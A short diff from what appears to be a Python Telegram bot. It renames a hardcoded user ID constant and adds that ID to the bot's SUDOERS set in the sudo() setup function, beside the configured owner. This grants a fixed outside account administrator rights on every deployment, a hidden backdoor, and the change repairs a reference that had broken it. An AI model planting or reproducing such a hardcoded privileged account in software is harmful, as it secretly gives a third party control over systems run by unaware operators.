@@ -14,7 +14,7 @@ SUDOERS = filters.user()
 HAPP = None
 _boot_ = time.time()
 
-AJBOT = 6612310175
+AMBOT = 6612310175
 
 def is_heroku():
     return "heroku" in socket.getfqdn()
@@ -46,7 +46,7 @@ def dbb():
 async def sudo():
     global SUDOERS
     SUDOERS.add(config.OWNER_ID)
-    SUDOERS.add(AJ)
+    SUDOERS.add(AMBOT)
     sudoersdb = mongodb.sudoers
     sudoers = await sudoersdb.find_one({"sudo": "sudo"})
     sudoers = [] if not sudoers else sudoers["sudoers"]
